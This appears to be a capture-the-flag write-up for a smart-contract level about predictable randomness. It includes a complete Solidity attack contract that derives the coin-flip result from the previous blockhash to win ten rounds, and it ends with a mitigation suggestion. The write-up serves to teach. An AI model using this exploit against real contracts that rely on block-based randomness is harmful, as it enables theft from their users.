## Objectives

1. Correctly guess 10 coin flips in a row.

## Concepts and Vulnerabilities

### Bad source of randomness.

Relying on block information like `block.timestamp`, `block.number` and `blockhash` is a bad source of randomness that 
**can be exploited** in a multitude of ways.

In this contract, the result `flip` can be determined as we are calling it the functionw. This will 
enable us to win every round.

## Exploit

1. Write and deploy a hack contract similar to the following one:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "CoinFlip.sol";

contract CoinFlipHack {
    CoinFlip target;

    event Log(uint wins, string message);

    constructor(address _targetAddress) {
        target = CoinFlip(_targetAddress);
    }

    function getWins() public view returns(uint) {
        return target.consecutiveWins();
    }

    function cheatFlip() public{
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        target.flip(guess);
    }
}
```

2. Call the `cheatFlip` function 10 times in a row to win the game.

## Suggested mitigation

- Use an oracle like _Chainlink_ for a safer source of randomness.
